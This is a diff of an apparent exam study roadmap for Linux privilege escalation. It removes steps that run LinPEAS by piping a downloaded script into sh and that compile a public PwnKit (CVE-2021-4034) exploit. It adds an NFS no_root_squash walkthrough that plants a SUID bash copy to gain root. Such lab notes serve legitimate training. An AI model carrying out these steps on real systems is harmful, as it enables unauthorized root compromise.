@@ -21,21 +21,32 @@ Exam RoadMap
 1,2,8,11,12,16,17,18,20,7 (10 marks)  10,19,4,5,15,14,13,6,3,9  
 
 **Priviledge Escalation**
-Use LinPeas
-1.	login to the ubuntu machine using the credentials given
-2.	go to google and type linpeas, go to the github depository and download linpeas.sh (found on the release page) or use the command given 
-3.	go to download. Cd Downloads/ then ls to view contents
-4.	chmod +x linpeas to be  executable then ls
-5.	run the executable by using attacke-1:~/Downloads$ ./linpeas.sh
-6.	The other one is you can use curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh, found on github as well
-7.	search for CVE-2021-4034 on mozilla the Cd Downloads/
-8.	git clone https://github.com/arthepsy/CVE-2021-4034.git
-9.	cd CVE-2021-4034
-10.	type command "make"
-11.	then type "./exploit" boom we are root
-12. Alternative2: you can copy the cve-2021-4034-poc.c from Downlods to /tmp then CD /tmp
-13. to compile you can use gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
-14. then ./cve-2021-4034-poc and press enter you should be root.
+**Misconfigured nfs shares**
+**Victim machine log in to target or ssh into it**
+1. root@ubuntu:~# Sudo apt-get update
+2. root@ubuntu:~# Sudo apt install nfs-kernel-server
+3. root@ubuntu:~# sudo nano etc/exports 
+>> This is what you add the entry inside the exports file:  /home   *(rw,no_root_squash)
+4. root@ubuntu:~# sudo /etc/init.d/nfs-kernel-server restart (you have to restart the server)
+5. root@ubuntu:~#
+**Attacker machine**
+You should see port 2049 open after scanning 
+1. attacker@parrot:~#sudo nmap -sV [IP]
+2. Do this manually nfs enumerate 
+3. attacker@parrot:~# apt-get install nfs-common 
+4. attacker@parrot:~#showmount -e [IP Addrr]) or attacker@parrot:~#sudo nmap -sV --script=nfs-showmount [victim IP]
+5. attacker@parrot:~#mkdir  /tmp/nfs
+6. attacker@parrot:~#sudo mount -t nfs [IP]:/home  /tmp/nfs
+7. attacker@parrot:~#cd  /tmp/nfs
+8. attacker@parrot:~#sudo cp /bin/bash .
+9. attacker@parrot:~#sudo chmod +s bash
+10. attacker@parrot:~#ls -la bash (you can see all the privileges) 
+11. ttacker@parrot:~#ssh ubuntu@[IP] (now we can ssh into our target machine) 
+12. attacker@parrot:~#cd /home
+13. attacker@parrot:~#ls -la
+14. attacker@parrot:~#./bash -p 
+15. id
+16. whoami
 
 Priviledge Escalation 2
 Exploiting misconfigured NFS (port 2049)
